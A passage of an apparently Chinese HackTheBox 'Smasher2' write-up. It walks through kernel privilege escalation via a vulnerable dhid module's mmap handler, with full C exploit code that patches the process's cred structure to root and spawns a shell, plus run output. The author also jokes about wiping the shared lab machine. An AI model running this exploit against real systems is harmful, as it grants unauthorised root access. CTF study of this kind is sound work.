dzonerzy@smasher2:~$ strings /var/log/auth.log | grep COMMAND | cut -d: -f5- | sort -u
 TTY=tty1 ; PWD=/home/dzonerzy ; USER=root ; COMMAND=/bin/chown root:root banner
 TTY=tty1 ; PWD=/home/dzonerzy ; USER=root ; COMMAND=/bin/su
 TTY=tty1 ; PWD=/home/dzonerzy ; USER=root ; COMMAND=/bin/systemctl enable rc.local.service
 TTY=tty1 ; PWD=/home/dzonerzy ; USER=root ; COMMAND=/usr/bin/apt-get update
 TTY=tty1 ; PWD=/home/dzonerzy ; USER=root ; COMMAND=/usr/bin/apt-get upgrade
 TTY=tty1 ; PWD=/home/dzonerzy ; USER=root ; COMMAND=/usr/bin/apt install apache2 python-pip
 TTY=tty1 ; PWD=/home/dzonerzy ; USER=root ; COMMAND=/usr/bin/id
 TTY=unknown ; PWD=/ ; USER=dzonerzy ; COMMAND=/bin/bash -c cd /home/dzonerzy/smanager && ./runner.py 2>&1 > /dev/null &
 TTY=unknown ; PWD=/ ; USER=root ; COMMAND=/sbin/insmod /lib/modules/4.15.0-45-generic/kernel/drivers/hid/dhid.ko
 user NOT in sudoers ; TTY=tty1 ; PWD=/home/dzonerzy ; USER=root ; COMMAND=/usr/bin/id
```

除了最后两个以外，其他似乎都在设置框。 倒数第二个启动以dzonerzy运行的Web服务器。 最后一个很有趣。
如果我在二进制文件上运行字符串，则会得到以下信息：

``` bash
dzonerzy@smasher2:~$ strings /lib/modules/4.15.0-45-generic/kernel/drivers/hid/dhid.ko
9Ogy7
AUATSL
D+&H
[A\A]]
UHc=
6DHID Device successfully closed
6DHID Device mmap( vma_size: %x, offset: %x)
6DHID mmap failed, requested too large a chunk of memory
This is the right way, please exploit this shit!
6DHID device has been opened %d time(s)
1DHID failed to register a major number
6DHID registered correctly with major number %d
1DHID failed to register device class
6DHID device class registered correctly
1DHID failed to create the device
6DHID device class created correctly
6DHID mmap failed
6DHID mmap OK
6DHID initializing the LKM
dhid
6DHID unloaded
version=1.0
description=LKM for dzonerzy dhid devices
author=DZONERZY
license=GPL
srcversion=974D0512693168483CADFE9
depends=
retpoline=Y
name=dhid
vermagic=4.15.0-45-generic SMP mod_unload 
dhid
GCC: (Ubuntu 7.3.0-27ubuntu1~18.04) 7.3.0
GCC: (Ubuntu 7.3.0-27ubuntu1~18.04) 7.3.0
dhid.c
set_node_perm
dev_release
dev_mmap
dev_read
dev_open
numberOpens
dhid_init
fops
majorNumber
__key.41070
dzcharClass
dzcharDev
dhid_exit
__UNIQUE_ID_version76
__UNIQUE_ID_description75
__UNIQUE_ID_author74
__UNIQUE_ID_license73
dhid.mod.c
__UNIQUE_ID_srcversion17
__module_depends
__UNIQUE_ID_retpoline16
__UNIQUE_ID_name15
__UNIQUE_ID_vermagic14
__class_create
__this_module
class_destroy
cleanup_module
remap_pfn_range
kfree
__fentry__
init_module
device_create
class_unregister
printk
size
_copy_to_user
__register_chrdev
device_destroy
__kmalloc
allocated
__unregister_chrdev
.symtab
.strtab
.shstrtab
.note.gnu.build-id
.rela.text
.rela.init.text
.rela.exit.text
.rodata.str1.8
.rodata.str1.1
.modinfo
.rela__mcount_loc
.rela.data
.rela.gnu.linkonce.this_module
.bss
.comment
.note.GNU-stack
```

可以在/dev中看到设备：

``` bash
dzonerzy@smasher2:~$ ls /dev/dhid -l
crwxrwxrwx 1 root root 243, 0 Dec 27 06:16 /dev/dhid
```

F-Secure的这篇论文在分解mmap处理程序以及如何查找其中的问题方面做得非常出色。 在第4节（第15页）中，介绍了如何利用它们。 它提供了一个示例，我将在此处尝试应用该示例，并了解我能得到多大的帮助。 我的想法是，我将使用mmap处理程序浏览内存以查找凭证结构（struct cred），该结构在此处定义：

``` bash
struct cred {
	atomic_t	usage;
#ifdef CONFIG_DEBUG_CREDENTIALS
	atomic_t	subscribers;	/* number of processes subscribed */
	void		*put_addr;
	unsigned	magic;
#define CRED_MAGIC	0x43736564
#define CRED_MAGIC_DEAD	0x44656144
#endif
	kuid_t		uid;		/* real UID of the task */
	kgid_t		gid;		/* real GID of the task */
	kuid_t		suid;		/* saved UID of the task */
	kgid_t		sgid;		/* saved GID of the task */
	kuid_t		euid;		/* effective UID of the task */
	kgid_t		egid;		/* effective GID of the task */
	kuid_t		fsuid;		/* UID for VFS ops */
	kgid_t		fsgid;		/* GID for VFS ops */
	unsigned	securebits;	/* SUID-less security management */
	kernel_cap_t	cap_inheritable; /* caps our children can inherit */
	kernel_cap_t	cap_permitted;	/* caps we're permitted */
	kernel_cap_t	cap_effective;	/* caps we can actually use */
	kernel_cap_t	cap_bset;	/* capability bounding set */
	kernel_cap_t	cap_ambient;	/* Ambient capability set */
#ifdef CONFIG_KEYS
	unsigned char	jit_keyring;	/* default keyring to attach requested
					 * keys to */
	struct key	*session_keyring; /* keyring inherited over fork */
	struct key	*process_keyring; /* keyring private to this process */
	struct key	*thread_keyring; /* keyring private to this thread */
	struct key	*request_key_auth; /* assumed request_key authority */
#endif
#ifdef CONFIG_SECURITY
	void		*security;	/* subjective LSM security */
#endif
	struct user_struct *user;	/* real user ID subscription */
	struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */
	struct group_info *group_info;	/* supplementary groups for euid/fsgid */
	/* RCU deletion */
	union {
		int non_rcu;			/* Can we skip RCU deletion? */
		struct rcu_head	rcu;		/* RCU deletion hook */
	};
} __randomize_layout;
```

值得注意的是，我看到了由当前用户（uid，guid，suid等）定义的8个连续的整数大小变量，然后是4个字节的securebit，然后是四个或五个（取决于内核）长整数，它们是这些功能 。
因此，策略将是：

使用mmap处理程序打开内存。
知道我们当前的uid是什么。
扫描内存以查找与当前用户的凭据结构相匹配的内容。
将uid/guid替换为0。
调用getuid（）看看我们现在是否是root。
如果是，则将功能替换为-1，然后以root身份生成一个新的sh进程，并中断循环。 如果不是，请将uid/guid设置回其原始值。

#### Exploitation

我将按照上面文章中的步骤构建脚本。 此代码可能令人生畏。 当我从这里开始并在Google上看到这篇论文时，我对此一无所知。 但是，如果您逐步执行代码，则很清楚它在做什么。

我要做的第一件事是尝试打开mmap设备。 我将从文章中获取代码（针对这种情况和样式，使用较小的mod）：

``` bash
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <sys/mman.h>
#include <unistd.h>

int main(int argc, char* const* argv)
{
    printf("[+] PID: %d\n", getpid());
    int fd = open("/dev/dhid", O_RDWR);
    if (fd < 0)
    {
        printf("[-] Open failed!\n");
        return-1;
    }
    printf("[+] Open OK fd: %d\n", fd);

    unsigned long size = 0xf0000000;
    unsigned long mmapStart = 0x42424000;
    unsigned int * addr = (unsigned int *)mmap((void*)mmapStart, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0x0);
    if (addr == MAP_FAILED)
    {
        perror("Failed to mmap: ");
        close(fd);
        return-1;
    }

    printf("[+] mmap OK addr: %lx\n", addr);
    int stop = getchar();
    return 0;
}
```

编译并运行：

``` bash
dzonerzy@smasher2:/dev/shm$ gcc exp1.c -o exp1
exp1.c: In function ‘main’:
exp1.c:29:33: warning: format ‘%lx’ expects argument of type ‘long unsigned int’, but argument 2 has type ‘unsigned int *’ [-Wformat=]
     printf("[+] mmap OK addr: %lx\n", addr);
                               ~~^
                               %ls
dzonerzy@smasher2:/dev/shm$ ls
exp1  exp1.c
dzonerzy@smasher2:/dev/shm$ ./exp1
[+] PID: 1911
[+] Open OK fd: 3
[+] mmap OK addr: 42424000
```

这样就可以打开mmap处理程序。 好的开始。 并且它按预期挂在getchar（）上。 我可以在另一个终端中通过SSH进行连接，并查看该进程的内存映射（它仍然处于活动状态并等待），并在第一行中看到dhid映射到我请求的地址：

``` bash
dzonerzy@smasher2:~$ cat /proc/1911/maps
42424000-132424000 rw-s 00000000 00:06 440                               /dev/dhid
55c3b4c63000-55c3b4c64000 r-xp 00000000 00:19 4                          /dev/shm/exp1
55c3b4e63000-55c3b4e64000 r--p 00000000 00:19 4                          /dev/shm/exp1
55c3b4e64000-55c3b4e65000 rw-p 00001000 00:19 4                          /dev/shm/exp1
55c3b6e38000-55c3b6e59000 rw-p 00000000 00:00 0                          [heap]
7f3e7313d000-7f3e73324000 r-xp 00000000 08:01 263261                     /lib/x86_64-linux-gnu/libc-2.27.so
7f3e73324000-7f3e73524000 ---p 001e7000 08:01 263261                     /lib/x86_64-linux-gnu/libc-2.27.so
7f3e73524000-7f3e73528000 r--p 001e7000 08:01 263261                     /lib/x86_64-linux-gnu/libc-2.27.so
7f3e73528000-7f3e7352a000 rw-p 001eb000 08:01 263261                     /lib/x86_64-linux-gnu/libc-2.27.so
7f3e7352a000-7f3e7352e000 rw-p 00000000 00:00 0 
7f3e7352e000-7f3e73555000 r-xp 00000000 08:01 263255                     /lib/x86_64-linux-gnu/ld-2.27.so
7f3e7374d000-7f3e7374f000 rw-p 00000000 00:00 0 
7f3e73755000-7f3e73756000 r--p 00027000 08:01 263255                     /lib/x86_64-linux-gnu/ld-2.27.so
7f3e73756000-7f3e73757000 rw-p 00028000 08:01 263255                     /lib/x86_64-linux-gnu/ld-2.27.so
7f3e73757000-7f3e73758000 rw-p 00000000 00:00 0 
7ffdc6c81000-7ffdc6ca2000 rw-p 00000000 00:00 0                          [stack]
7ffdc6cf5000-7ffdc6cf8000 r--p 00000000 00:00 0                          [vvar]
7ffdc6cf8000-7ffdc6cfa000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
```

使用root shell（我将很快使用它），我可以查看所有内存。 我调用了mmap，其偏移量为0，大小为0xf0000000字节。 这意味着我现在可以进入该空间。 我将在一行上打上一行，以访问上面的所有内容：

``` bash
dzonerzy@smasher2:~$ cat /proc/iomem
00000000-00000000 : Reserved
00000000-00000000 : System RAM
00000000-00000000 : Reserved
00000000-00000000 : PCI Bus 0000:00
00000000-00000000 : Video ROM
00000000-00000000 : Adapter ROM
00000000-00000000 : PCI Bus 0000:00
00000000-00000000 : PCI Bus 0000:00
00000000-00000000 : PCI Bus 0000:00
00000000-00000000 : PCI Bus 0000:00
00000000-00000000 : Reserved
  00000000-00000000 : System ROM
00000000-00000000 : System RAM
  00000000-00000000 : Kernel code
  00000000-00000000 : Kernel data
  00000000-00000000 : Kernel bss
00000000-00000000 : ACPI Tables
00000000-00000000 : ACPI Non-volatile Storage
00000000-00000000 : System RAM
00000000-00000000 : PCI Bus 0000:00
  00000000-00000000 : 0000:00:10.0
  00000000-00000000 : PCI Bus 0000:22
  00000000-00000000 : PCI Bus 0000:1a
  00000000-00000000 : PCI Bus 0000:12
  00000000-00000000 : PCI Bus 0000:0a
  00000000-00000000 : PCI Bus 0000:21
  00000000-00000000 : PCI Bus 0000:19
  00000000-00000000 : PCI Bus 0000:11
  00000000-00000000 : PCI Bus 0000:09
  00000000-00000000 : PCI Bus 0000:20
  00000000-00000000 : PCI Bus 0000:18
  00000000-00000000 : PCI Bus 0000:10
  00000000-00000000 : PCI Bus 0000:08
  00000000-00000000 : PCI Bus 0000:1f
  00000000-00000000 : PCI Bus 0000:17
  00000000-00000000 : PCI Bus 0000:0f
  00000000-00000000 : PCI Bus 0000:07
  00000000-00000000 : PCI Bus 0000:1e
  00000000-00000000 : PCI Bus 0000:16
  00000000-00000000 : PCI Bus 0000:0e
  00000000-00000000 : PCI Bus 0000:06
  00000000-00000000 : PCI Bus 0000:1d
  00000000-00000000 : PCI Bus 0000:15
  00000000-00000000 : PCI Bus 0000:0d
  00000000-00000000 : PCI Bus 0000:05
  00000000-00000000 : PCI Bus 0000:1c
  00000000-00000000 : PCI Bus 0000:14
  00000000-00000000 : PCI Bus 0000:0c
  00000000-00000000 : PCI Bus 0000:04
  00000000-00000000 : PCI Bus 0000:1b
  00000000-00000000 : PCI Bus 0000:13
  00000000-00000000 : PCI Bus 0000:0b
  00000000-00000000 : PCI Bus 0000:03
  00000000-00000000 : PCI Bus 0000:02
  00000000-00000000 : 0000:00:0f.0
    00000000-00000000 : vmwgfx probe
  00000000-00000000 : PCI MMCONFIG 0000 [bus 00-7f]
    00000000-00000000 : Reserved
      00000000-00000000 : pnp 00:05
  00000000-00000000 : PCI Bus 0000:22
  00000000-00000000 : PCI Bus 0000:1a
  00000000-00000000 : PCI Bus 0000:12
  00000000-00000000 : PCI Bus 0000:0a
  00000000-00000000 : PCI Bus 0000:21
  00000000-00000000 : PCI Bus 0000:19
  00000000-00000000 : PCI Bus 0000:11
  00000000-00000000 : PCI Bus 0000:09
  00000000-00000000 : PCI Bus 0000:20
  00000000-00000000 : PCI Bus 0000:18
  00000000-00000000 : PCI Bus 0000:10
  00000000-00000000 : PCI Bus 0000:08
  00000000-00000000 : PCI Bus 0000:1f
  00000000-00000000 : PCI Bus 0000:17
  00000000-00000000 : PCI Bus 0000:0f
  00000000-00000000 : PCI Bus 0000:07
  00000000-00000000 : PCI Bus 0000:1e
  00000000-00000000 : PCI Bus 0000:16
  00000000-00000000 : PCI Bus 0000:0e
  00000000-00000000 : PCI Bus 0000:06
  00000000-00000000 : PCI Bus 0000:1d
  00000000-00000000 : PCI Bus 0000:15
  00000000-00000000 : PCI Bus 0000:0d
  00000000-00000000 : PCI Bus 0000:05
  00000000-00000000 : PCI Bus 0000:1c
  00000000-00000000 : PCI Bus 0000:14
  00000000-00000000 : PCI Bus 0000:0c
  00000000-00000000 : PCI Bus 0000:04
  00000000-00000000 : PCI Bus 0000:1b
  00000000-00000000 : PCI Bus 0000:13
  00000000-00000000 : PCI Bus 0000:0b
  00000000-00000000 : PCI Bus 0000:03
  00000000-00000000 : PCI Bus 0000:02
    00000000-00000000 : 0000:02:01.0
    00000000-00000000 : 0000:02:03.0
      00000000-00000000 : ehci_hcd
    00000000-00000000 : 0000:02:02.0
      00000000-00000000 : ICH HD audio
  00000000-00000000 : 0000:00:0f.0
    00000000-00000000 : vmwgfx probe
  00000000-00000000 : pnp 00:05
  00000000-00000000 : 0000:00:10.0
    00000000-00000000 : mpt
  00000000-00000000 : 0000:00:10.0
    00000000-00000000 : mpt
  00000000-00000000 : 0000:00:07.7
00000000-00000000 : Reserved
  00000000-00000000 : IOAPIC 0
00000000-00000000 : HPET 0
  00000000-00000000 : pnp 00:04
00000000-00000000 : Local APIC
  00000000-00000000 : Reserved
00000000-00000000 : Reserved
```

 - 查找凭证结构

现在，更新上面的代码以通过获取当前uid来在内存中查找凭证对象，然后添加一个循环以连续八次查找该int：

``` bash
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <sys/mman.h>
#include <unistd.h>

int main(int argc, char* const* argv)
{
    printf("[+] PID: %d\n", getpid());
    int fd = open("/dev/dhid", O_RDWR);
    if (fd < 0)
    {
        printf("[-] Open failed!\n");
        return-1;
    }
    printf("[+] Open OK fd: %d\n", fd);

    unsigned long size = 0xf0000000;
    unsigned long mmapStart = 0x42424000;
    unsigned int * addr = (unsigned int *)mmap((void*)mmapStart, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0x0);
    if (addr == MAP_FAILED)
    {
        perror("Failed to mmap: ");
        close(fd);
        return-1;
    }


    printf("[+] mmap OK addr: %x\n", addr);

    unsigned int uid = getuid();
    printf("[+] UID: %d\n", uid);

    unsigned int credIt = 0;
    unsigned int credNum = 0;
    while (((unsigned long)addr) < (mmapStart + size -0x40))
    {
        credIt = 0;
        if (
            addr[credIt++] == uid &&
            addr[credIt++] == uid &&
            addr[credIt++] == uid &&
            addr[credIt++] == uid &&
            addr[credIt++] == uid &&
            addr[credIt++] == uid &&
            addr[credIt++] == uid &&
            addr[credIt++] == uid
            )
        {
            credNum++;
            printf("[+] Found cred structure! ptr: %p, credNum: %d\n", addr, credNum);
        }
        addr++;
    }
    puts("[+] Scanning loop END");
    fflush(stdout);

    int stop = getchar();
    return 0;
}
```

当我编译并运行时，它会发现19种潜在的cred structs:

``` bash
dzonerzy@smasher2:/dev/shm$ gcc exp2.c -o exp2
exp2.c: In function ‘main’:
exp2.c:30:32: warning: format ‘%x’ expects argument of type ‘unsigned int’, but argument 2 has type ‘unsigned int *’ [-Wformat=]
     printf("[+] mmap OK addr: %x\n", addr);
                               ~^
                               %ls
dzonerzy@smasher2:/dev/shm$ ./exp2
[+] PID: 1999
[+] Open OK fd: 3
[+] mmap OK addr: 42424000
[+] UID: 1000
[+] Found cred structure! ptr: 0x762ba6c4, credNum: 1
[+] Found cred structure! ptr: 0x762ba9c4, credNum: 2
[+] Found cred structure! ptr: 0xb7a980c4, credNum: 3
[+] Found cred structure! ptr: 0xb7a98484, credNum: 4
[+] Found cred structure! ptr: 0xb7a99384, credNum: 5
[+] Found cred structure! ptr: 0xb7a99444, credNum: 6
[+] Found cred structure! ptr: 0xb7a995c4, credNum: 7
[+] Found cred structure! ptr: 0xb7a99c84, credNum: 8
[+] Found cred structure! ptr: 0xb87d6184, credNum: 9
[+] Found cred structure! ptr: 0xb87d6484, credNum: 10
[+] Found cred structure! ptr: 0xb87d6544, credNum: 11
[+] Found cred structure! ptr: 0xb87d6b44, credNum: 12
[+] Found cred structure! ptr: 0xb87d6c04, credNum: 13
[+] Found cred structure! ptr: 0xb87d6d84, credNum: 14
[+] Found cred structure! ptr: 0xb87d7744, credNum: 15
[+] Found cred structure! ptr: 0xb8e86c04, credNum: 16
[+] Found cred structure! ptr: 0xb8e87384, credNum: 17
[+] Found cred structure! ptr: 0xb8e87984, credNum: 18
[+] Found cred structure! ptr: 0xb9327c84, credNum: 19
[+] Scanning loop END
```

 - 查找当前进程Cred

现在，更新代码，以便针对每个潜在的cred结构，将其更改为root用户和组ID 0，然后尝试运行getuid（）。 如果该值返回0（对于root用户），则说明我已经为当前进程修改了凭据结构。

更新代码，如下所示：

``` bash
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <sys/mman.h>
#include <unistd.h>

int main(int argc, char* const* argv)
{
    printf("[+] PID: %d\n", getpid());
    int fd = open("/dev/dhid", O_RDWR);
    if (fd < 0)
    {
        printf("[-] Open failed!\n");
        return-1;
    }
    printf("[+] Open OK fd: %d\n", fd);

    unsigned long size = 0xf0000000;
    unsigned long mmapStart = 0x42424000;
    unsigned int * addr = (unsigned int *)mmap((void*)mmapStart, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0x0);
    if (addr == MAP_FAILED)
    {
        perror("Failed to mmap: ");
        close(fd);
        return-1;
    }


    printf("[+] mmap OK addr: %x\n", addr);

    unsigned int uid = getuid();
    printf("[+] UID: %d\n", uid);

    unsigned int credIt = 0;
    unsigned int credNum = 0;
    while (((unsigned long)addr) < (mmapStart + size -0x40))
    {
        credIt = 0;
        if (
            addr[credIt++] == uid &&
            addr[credIt++] == uid &&
            addr[credIt++] == uid &&
            addr[credIt++] == uid &&
            addr[credIt++] == uid &&
            addr[credIt++] == uid &&
            addr[credIt++] == uid &&
            addr[credIt++] == uid
            )
        {
            credNum++;
            printf("[+] Found cred structure! ptr: %p, credNum: %d\n", addr, credNum);

            credIt = 0;
            addr[credIt++] = 0;
            addr[credIt++] = 0;
            addr[credIt++] = 0;
            addr[credIt++] = 0;
            addr[credIt++] = 0;
            addr[credIt++] = 0;
            addr[credIt++] = 0;
            addr[credIt++] = 0;

            if (getuid() == 0)
            {
                puts("[+] GOT ROOT!");
                break;
            }
            else
            {
                credIt = 0;
                addr[credIt++] = uid;
                addr[credIt++] = uid;
                addr[credIt++] = uid;
                addr[credIt++] = uid;
                addr[credIt++] = uid;
                addr[credIt++] = uid;
                addr[credIt++] = uid;
                addr[credIt++] = uid;
            }

        }
        addr++;
    }
    puts("[+] Scanning loop END");
    fflush(stdout);

    int stop = getchar();
    return 0;
}
```

现在，编译并运行，并且可以成为root用户，这意味着它可以正常工作：

``` bash
dzonerzy@smasher2:/dev/shm$ gcc exp3.c -o exp3
exp3.c: In function ‘main’:
exp3.c:30:32: warning: format ‘%x’ expects argument of type ‘unsigned int’, but argument 2 has type ‘unsigned int *’ [-Wformat=]
     printf("[+] mmap OK addr: %x\n", addr);
                               ~^
                               %ls
dzonerzy@smasher2:/dev/shm$ ./exp3
[+] PID: 2008
[+] Open OK fd: 3
[+] mmap OK addr: 42424000
[+] UID: 1000
[+] Found cred structure! ptr: 0x762ba6c4, credNum: 1
[+] Found cred structure! ptr: 0x762ba9c4, credNum: 2
[+] Found cred structure! ptr: 0xb7a980c4, credNum: 3
[+] Found cred structure! ptr: 0xb7a99444, credNum: 4
[+] Found cred structure! ptr: 0xb7a995c4, credNum: 5
[+] Found cred structure! ptr: 0xb7a99c84, credNum: 6
[+] Found cred structure! ptr: 0xb87d6184, credNum: 7
[+] Found cred structure! ptr: 0xb87d6484, credNum: 8
[+] Found cred structure! ptr: 0xb87d6544, credNum: 9
[+] Found cred structure! ptr: 0xb87d6b44, credNum: 10
[+] Found cred structure! ptr: 0xb87d6c04, credNum: 11
[+] Found cred structure! ptr: 0xb87d6d84, credNum: 12
[+] Found cred structure! ptr: 0xb87d7144, credNum: 13
[+] Found cred structure! ptr: 0xb87d7204, credNum: 14
[+] GOT ROOT!
[+] Scanning loop END
```
在等待getchar（）时，可以检查该进程的状态，并查看它以root身份运行：

``` bash
dzonerzy@smasher2:~$ cat /proc/2008/status
Name:   exp3
Umask:  0002
State:  S (sleeping)
Tgid:   2008
Ngid:   0
Pid:    2008
PPid:   1833
TracerPid:      0
Uid:    0       0       0       0     <-- root
Gid:    0       0       0       0     <-- root group
FDSize: 256
Groups: 4 24 30 46 111 112 1000 
NStgid: 2008
NSpid:  2008
NSpgid: 2008
NSsid:  1833
VmPeak:  3936672 kB
VmSize:  3936672 kB
VmLck:         0 kB
VmPin:         0 kB
VmHWM:       792 kB
VmRSS:       792 kB
RssAnon:              64 kB
RssFile:             720 kB
RssShmem:              8 kB
VmData:      176 kB
VmStk:       132 kB
VmExe:         8 kB
VmLib:      2112 kB
VmPTE:      7760 kB
VmSwap:        0 kB
HugetlbPages:          0 kB
CoreDumping:    0
Threads:        1
SigQ:   0/7400
SigPnd: 0000000000000000
ShdPnd: 0000000000000000
SigBlk: 0000000000000000
SigIgn: 0000000000000000
SigCgt: 0000000000000000
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
NoNewPrivs:     0
Seccomp:        0
Speculation_Store_Bypass:       thread vulnerable
Cpus_allowed:   ffffffff,ffffffff,ffffffff,ffffffff
Cpus_allowed_list:      0-127
Mems_allowed:   00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000001
Mems_allowed_list:      0
voluntary_ctxt_switches:        1
nonvoluntary_ctxt_switches:     96
```

 - get root

现在，我将其升级以获得shell。 只需要添加将功能设置为全1的代码，然后执行一个shell：

``` bash
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <sys/mman.h>
#include <unistd.h>

int main(int argc, char* const* argv)
{
    printf("[+] PID: %d\n", getpid());
    int fd = open("/dev/dhid", O_RDWR);
    if (fd < 0)
    {
        printf("[-] Open failed!\n");
        return-1;
    }
    printf("[+] Open OK fd: %d\n", fd);

    unsigned long size = 0xf0000000;
    unsigned long mmapStart = 0x42424000;
    unsigned int * addr = (unsigned int *)mmap((void*)mmapStart, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0x0);
    if (addr == MAP_FAILED)
    {
        perror("Failed to mmap: ");
        close(fd);
        return-1;
    }


    printf("[+] mmap OK addr: %x\n", addr);

    unsigned int uid = getuid();
    printf("[+] UID: %d\n", uid);

    unsigned int credIt = 0;
    unsigned int credNum = 0;
    while (((unsigned long)addr) < (mmapStart + size -0x40))
    {
        credIt = 0;
        if (
            addr[credIt++] == uid &&
            addr[credIt++] == uid &&
            addr[credIt++] == uid &&
            addr[credIt++] == uid &&
            addr[credIt++] == uid &&
            addr[credIt++] == uid &&
            addr[credIt++] == uid &&
            addr[credIt++] == uid
            )
        {
            credNum++;
            printf("[+] Found cred structure! ptr: %p, credNum: %d\n", addr, credNum);

            credIt = 0;
            addr[credIt++] = 0;
            addr[credIt++] = 0;
            addr[credIt++] = 0;
            addr[credIt++] = 0;
            addr[credIt++] = 0;
            addr[credIt++] = 0;
            addr[credIt++] = 0;
            addr[credIt++] = 0;

            if (getuid() == 0)
            {
                puts("[+] GOT ROOT!");

                credIt += 1; //skip 4 bytes to get to caps
                addr[credIt++] = 0xffffffff;
                addr[credIt++] = 0xffffffff;
                addr[credIt++] = 0xffffffff;
                addr[credIt++] = 0xffffffff;
                addr[credIt++] = 0xffffffff;
                addr[credIt++] = 0xffffffff;
                addr[credIt++] = 0xffffffff;
                addr[credIt++] = 0xffffffff;

                execl("/bin/sh", "-", (char *)NULL);
                break;
            }
            else
            {
                credIt = 0;
                addr[credIt++] = uid;
                addr[credIt++] = uid;
                addr[credIt++] = uid;
                addr[credIt++] = uid;
                addr[credIt++] = uid;
                addr[credIt++] = uid;
                addr[credIt++] = uid;
                addr[credIt++] = uid;
            }

        }
        addr++;
    }
    puts("[+] Scanning loop END");
    fflush(stdout);

    int stop = getchar();
    return 0;
}
```

现在像以前一样编译，然后运行：

``` bash
dzonerzy@smasher2:/dev/shm$ gcc exp4.c -o exp4
exp4.c: In function ‘main’:
exp4.c:30:32: warning: format ‘%x’ expects argument of type ‘unsigned int’, but argument 2 has type ‘unsigned int *’ [-Wformat=]
     printf("[+] mmap OK addr: %x\n", addr);
                               ~^
                               %ls
dzonerzy@smasher2:/dev/shm$ ./exp4
[+] PID: 2019
[+] Open OK fd: 3
[+] mmap OK addr: 42424000
[+] UID: 1000
[+] Found cred structure! ptr: 0x762ba6c4, credNum: 1
[+] Found cred structure! ptr: 0x762ba9c4, credNum: 2
[+] Found cred structure! ptr: 0xb7a980c4, credNum: 3
[+] Found cred structure! ptr: 0xb7a98844, credNum: 4
[+] Found cred structure! ptr: 0xb7a99204, credNum: 5
[+] GOT ROOT!
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare),1000(dzonerzy)
# whoami
root
```

成功获取root权限，现在读取flag并提交,帅到飞天。

``` bash
# cd /root
# ls
CREDITS.txt  root.txt
# cat CREDITS.txt
SMASHER2 by dzonerzy@htb in collaboration with xg0@htb have fun and be ready for smasher3!
# cat root.txt
7791e0e************************
```

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb11.jpg)

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb12.jpg)

知识点总结：

 - 身份验证绕过
 - RCE与WAF绕过
 - 不安全mmap程序实现的内核模块(该模块允许用户访问内核内存)

最后演示一下性感大佬在线删除靶机，删自己的靶机，让别人无靶机可打，小盆友请勿模仿，太黄太暴力过程就不演示了！！！;)

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb13.jpg)

嗯，，，已经删到残废了。。。

<font color="red">Game over</font>

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg)

<font color="green">***The end,to be continue...***</font>
<!-- kb:end Smasher2 -->

</details>

